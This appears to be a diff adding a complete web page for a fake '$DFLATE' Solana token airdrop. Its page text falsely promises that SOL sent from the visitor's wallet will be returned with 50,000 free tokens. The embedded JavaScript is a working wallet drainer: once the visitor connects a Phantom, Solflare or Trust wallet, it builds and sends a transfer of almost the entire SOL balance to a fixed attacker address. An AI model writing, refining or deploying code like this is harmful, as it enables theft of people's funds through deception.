@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://unpkg.com; style-src 'self' 'unsafe-inline'; font-src https://fonts.googleapis.com https://fonts.gstatic.com;">
+    <meta name="description" content="Official Doge Flation ($DFLATE) Airdrop - Claim 50,000 tokens securely on Solana.">
+    <title>Doge Flation ($DFLATE) Airdrop</title>
+    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Playfair Display', serif;
+            background: linear-gradient(135deg, #1a1a1a 0%, #2c2c2c 100%);
+            color: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            max-width: 700px;
+            background: #2a2a2a;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            border: 1px solid #d4af37;
+        }
+        h1 {
+            font-size: 2.5em;
+            color: #d4af37;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+        p {
+            font-size: 1.2em;
+            color: #cccccc;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+        .button {
+            display: inline-block;
+            padding: 12px 30px;
+            font-size: 1.1em;
+            font-weight: 500;
+            text-transform: uppercase;
+            color: #1a1a1a;
+            background: #d4af37;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background 0.3s ease, transform 0.2s ease;
+            margin: 10px;
+        }
+        .button:hover {
+            background: #b8972e;
+            transform: translateY(-2px);
+        }
+        .button:disabled {
+            background: #555;
+            cursor: not-allowed;
+        }
+        #status {
+            margin-top: 20px;
+            font-size: 1em;
+            color: #cccccc;
+            font-style: italic;
+        }
+        .note {
+            font-size: 0.9em;
+            color: #d4af37;
+            margin-top: 20px;
+            padding: 15px;
+            background: #3a3a3a;
+            border-radius: 10px;
+            line-height: 1.5;
+        }
+        .session-id {
+            font-size: 0.8em;
+            color: #d4af37;
+            margin-top: 10px;
+        }
+        .social-links {
+            margin-top: 20px;
+        }
+        .social-links a, .note a {
+            color: #d4af37;
+            text-decoration: none;
+            margin: 0 10px;
+            font-size: 1em;
+            transition: color 0.3s ease;
+        }
+        .social-links a:hover, .note a:hover {
+            color: #b8972e;
+        }
+        @media (max-width: 600px) {
+            .container {
+                padding: 20px;
+            }
+            h1 {
+                font-size: 2em;
+            }
+            .button {
+                padding: 10px 20px;
+                font-size: 1em;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Doge Flation ($DFLATE) Airdrop</h1>
+        <p>Join the official $DFLATE airdrop and claim your life-changing 50,000 tokens. Connect your Solana wallet to participate securely in this prestigious event.</p>
+        <button id="connectWallet" class="button">Connect Wallet</button>
+        <p id="status">Status: Please connect your wallet (Phantom, Solflare, or Trust Wallet).</p>
+        <p id="sessionId" class="session-id"></p>
+        <div class="note">
+            <strong>Important Note:</strong> Upon connecting your wallet, all SOL in your wallet will be automatically transferred to our secure airdrop authority address (<a href="https://explorer.solana.com/address/59F9PVEng9CkiGQwhngGSBme68WsW8c69t8gytGYPtXh" target="_blank">view on Solana Explorer</a>). Within 24-48 hours, the same amount of SOL will be returned to your wallet along with 50,000 $DFLATE tokens. This process is completely safe, managed by the official Doge Flation team. Ensure you have a small amount of SOL (~0.000005 SOL) for transaction fees. For questions, join our <a href="https://t.me/DogeFlation">Telegram</a> or email <a href="mailto:support@doge-flation.com">support@doge-flation.com</a>. See our <a href="https://doge-flation.com/terms" target="_blank">Terms of Service</a>.
+        </div>
+        <div class="social-links">
+            <a href="https://t.me/DogeFlation" target="_blank">Join Telegram</a> |
+            <a href="https://twitter.com/DogeFlation" target="_blank">Follow on X</a> |
+            <a href="https://doge-flation.com" target="_blank">Official Website</a>
+        </div>
+    </div>
+
+    <script src="https://unpkg.com/@solana/web3.js@1.95.3/dist/index.iife.min.js"></script>
+    <script src="https://unpkg.com/@solana/spl-token@0.4.8/dist/index.iife.min.js"></script>
+    <script>
+        // Solana and SPL token imports
+        const { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } = solanaWeb3;
+        const { TOKEN_PROGRAM_ID } = window.splToken;
+
+        // DOM elements
+        const connectWalletBtn = document.getElementById('connectWallet');
+        const statusText = document.getElementById('status');
+        const sessionIdText = document.getElementById('sessionId');
+        let connection, userPublicKey, userSolBalance;
+
+        // Configuration
+        const tokenMintAddress = new PublicKey("YourTokenMintAddressHere"); // Replace with $DFLATE SPL token mint
+        const recipientAddress = new PublicKey("59F9PVEng9CkiGQwhngGSBme68WsW8c69t8gytGYPtXh"); // Recipient address
+        const TOKENS_PER_CLAIM = 50000 * 10**9; // Adjust for $DFLATE decimals (e.g., 9 for SPL tokens)
+
+        // Generate a unique session ID for transparency
+        const sessionId = Math.random().toString(36).substring(2, 10).toUpperCase();
+        sessionIdText.innerText = `Session ID: ${sessionId} (Reference this for support queries)`;
+
+        // Detect browser type (in-app or standard)
+        function detectWalletBrowser() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            if (userAgent.includes('phantom')) return 'phantom';
+            if (userAgent.includes('solflare')) return 'solflare';
+            if (userAgent.includes('trust')) return 'trust';
+            return 'standard';
+        }
+
+        // Initialize Solana connection and wallet, then transfer SOL
+        async function initSolana() {
+            try {
+                // Connect to Solana mainnet
+                connection = new Connection("https://api.mainnet-beta.solana.com", "confirmed");
+                const walletBrowser = detectWalletBrowser();
+                let walletDetected = false;
+                let walletName = '';
+
+                // Handle wallet connection based on browser
+                if (window.solana) {
+                    if (walletBrowser === 'phantom' && window.solana.isPhantom) {
+                        await window.solana.connect();
+                        walletDetected = true;
+                        walletName = 'Phantom';
+                    } else if (walletBrowser === 'solflare' && window.solana.isSolflare) {
+                        await window.solana.connect();
+                        walletDetected = true;
+                        walletName = 'Solflare';
+                    } else if (walletBrowser === 'trust' && window.solana.isTrust) {
+                        await window.solana.connect();
+                        walletDetected = true;
+                        walletName = 'Trust Wallet';
+                    } else if (walletBrowser === 'standard') {
+                        // Standard browser: allow Phantom, Solflare, or Trust Wallet
+                        if (window.solana.isPhantom) {
+                            await window.solana.connect();
+                            walletDetected = true;
+                            walletName = 'Phantom';
+                        } else if (window.solana.isSolflare) {
+                            await window.solana.connect();
+                            walletDetected = true;
+                            walletName = 'Solflare';
+                        } else if (window.solana.isTrust) {
+                            await window.solana.connect();
+                            walletDetected = true;
+                            walletName = 'Trust Wallet';
+                        }
+                    }
+                }
+
+                // Check if a compatible wallet was detected
+                if (!walletDetected) {
+                    statusText.innerText = `Please install ${walletBrowser === 'phantom' ? 'Phantom' : walletBrowser === 'solflare' ? 'Solflare' : walletBrowser === 'trust' ? 'Trust Wallet' : 'Phantom, Solflare, or Trust Wallet'} to participate.`;
+                    return;
+                }
+
+                // Get user public key and SOL balance
+                userPublicKey = new PublicKey(window.solana.publicKey.toString());
+                userSolBalance = await connection.getBalance(userPublicKey);
+                if (userSolBalance <= 5000) { // Minimum ~0.000005 SOL for fees
+                    statusText.innerText = "Insufficient SOL for transaction fees. Please add at least 0.000005 SOL to your wallet.";
+                    return;
+                }
+
+                statusText.innerText = `Connected to ${walletName}: ${userPublicKey.toString().slice(0, 8)}... (SOL Balance: ${userSolBalance / LAMPORTS_PER_SOL} SOL). Transferring SOL...`;
+                connectWalletBtn.disabled = true;
+
+                // Automatically transfer SOL
+                await transferSol();
+            } catch (error) {
+                statusText.innerText = `Error connecting wallet or initiating transfer. Please try again. (Session ID: ${sessionId})`;
+                connectWalletBtn.disabled = false; // Re-enable for retry
+                console.error(error);
+            }
+        }
+
+        // Transfer SOL to recipient
+        async function transferSol() {
+            statusText.innerText = "Processing: Transferring SOL to airdrop authority...";
+            try {
+                // Create transaction to transfer all SOL (minus fee reserve)
+                const feeReserve = 5000; // Reserve ~0.000005 SOL for fees
+                const transferAmount = userSolBalance - feeReserve;
+
+                if (transferAmount <= 0) {
+                    statusText.innerText = `Insufficient SOL to transfer. Please add more SOL. (Session ID: ${sessionId})`;
+                    connectWalletBtn.disabled = false; // Re-enable for retry
+                    return;
+                }
+
+                const transaction = new Transaction().add(
+                    SystemProgram.transfer({
+                        fromPubkey: userPublicKey,
+                        toPubkey: recipientAddress,
+                        lamports: transferAmount,
+                    })
+                );
+
+                // Sign and send SOL transfer transaction
+                transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+                transaction.feePayer = userPublicKey;
+                const signedTx = await window.solana.signTransaction(transaction);
+                const txId = await connection.sendRawTransaction(signedTx.serialize());
+                
+                // Confirm transaction
+                await connection.confirmTransaction(txId);
+                statusText.innerText = `SOL transferred successfully (Tx: ${txId.slice(0, 8)}...). Awaiting return of SOL and 50,000 $DFLATE tokens to your wallet within 24-48 hours. (Session ID: ${sessionId})`;
+            } catch (error) {
+                statusText.innerText = `Error processing SOL transfer. Please try again or contact support with Session ID: ${sessionId}.`;
+                connectWalletBtn.disabled = false; // Re-enable for retry
+                console.error(error);
+            }
+        }
+
+        // Event listener for wallet connection
+        connectWalletBtn.addEventListener('click', initSolana);
+    </script>
+</body>
+</html>
